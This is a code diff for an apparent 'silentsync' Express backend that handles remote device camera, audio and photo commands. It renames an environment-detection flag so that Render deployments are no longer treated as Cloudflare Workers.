@@ -12,12 +12,12 @@ import { WebSocketServer, WebSocket } from "ws";
 dotenv.config();
 
 // Helper for filesystem paths (local only)
-const isWorker =
-  typeof (globalThis as any).WebSocketPair !== "undefined" ||
-  !!(globalThis as any).caches;
+// Check specifically for Cloudflare Workers (not Render)
+const isCloudflareWorker =
+  typeof (globalThis as any).WebSocketPair !== "undefined";
 let __filename: string, __dirname: string;
 
-if (!isWorker) {
+if (!isCloudflareWorker) {
   __filename = fileURLToPath(import.meta.url);
   __dirname = path.dirname(__filename);
 }
@@ -33,7 +33,7 @@ const getFirebaseConfig = () => {
     }
   }
   // Try to read from local file (development only)
-  if (!isWorker) {
+  if (!isCloudflareWorker) {
     try {
       return JSON.parse(
         fs.readFileSync(path.join(__dirname, "firebase-config.json"), "utf8"),
@@ -59,7 +59,7 @@ const getServiceAccount = () => {
     }
   }
   // Try to read from local file (development only)
-  if (!isWorker) {
+  if (!isCloudflareWorker) {
     try {
       const files = fs.readdirSync(__dirname);
       const serviceAccountFile = files.find(
@@ -156,7 +156,7 @@ app.get("/health", (req, res) => {
   res.json({
     status: "healthy",
     timestamp: new Date().toISOString(),
-    environment: isWorker ? "cloudflare-worker" : "node",
+    environment: isCloudflareWorker ? "cloudflare-worker" : "node",
   });
 });
 
@@ -366,8 +366,8 @@ app.post("/api/command/:deviceId", async (req, res) => {
     // Handle camera_capture command
     if (type === "camera_capture") {
       // Use WebSocket URL based on environment
-      const protocol = req.secure || isWorker ? "wss" : "ws";
-      const host = isWorker
+      const protocol = req.secure || isCloudflareWorker ? "wss" : "ws";
+      const host = isCloudflareWorker
         ? "silentsync-backend.onrender.com"
         : req.headers.host;
       const streamUrl = `${protocol}://${host}/camera-stream?deviceId=${deviceId}`;
@@ -475,7 +475,7 @@ app.post("/api/upload-audio/:deviceId", async (req, res) => {
   }
 
   // Cloudflare Worker mode: return error (use R2 for production)
-  if (isWorker) {
+  if (isCloudflareWorker) {
     return res.status(501).json({
       error:
         "Audio storage requires Cloudflare R2 or external storage on this platform. " +
@@ -581,7 +581,7 @@ app.post("/api/upload-photo/:deviceId", async (req, res) => {
   }
 
   // Cloudflare Worker mode: return error (use R2 for production)
-  if (isWorker) {
+  if (isCloudflareWorker) {
     console.error(
       "[Photo] Cloudflare Worker mode not supported for local storage",
     );
@@ -635,7 +635,7 @@ app.post("/api/upload-photo/:deviceId", async (req, res) => {
 });
 
 // Serve static photos (Local only)
-if (!isWorker) {
+if (!isCloudflareWorker) {
   const uploadsDir = path.join(__dirname, "public", "uploads");
 
   // Create uploads directory if it doesn't exist
@@ -675,7 +675,7 @@ const cameraStreams = new Map<string, Set<WebSocket>>();
 
 // Start local server if not on Cloudflare Worker
 // Note: Render is NOT a Cloudflare Worker, so WebSocket server should run there
-if (!isWorker || !!(globalThis as any).caches) {
+if (!isCloudflareWorker || !!(globalThis as any).caches) {
   const PORT = parseInt(process.env.PORT || "3000", 10);
 
   const server = app.listen(PORT, "0.0.0.0", () => {
